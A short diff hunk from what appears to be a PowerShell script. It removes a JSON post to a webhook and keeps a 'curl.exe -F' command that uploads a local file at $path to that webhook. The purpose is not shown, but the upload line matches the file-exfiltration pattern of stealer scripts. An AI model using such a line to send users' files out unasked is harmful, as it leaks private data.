@@ -16,8 +16,6 @@ $form = @{
     "payload_json" = $body
 }
 
-Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($body | ConvertTo-Json) -ContentType 'application/json'
-
 # Upload file using curl
 curl.exe -F "file1=@$path" $webhookUrl
 
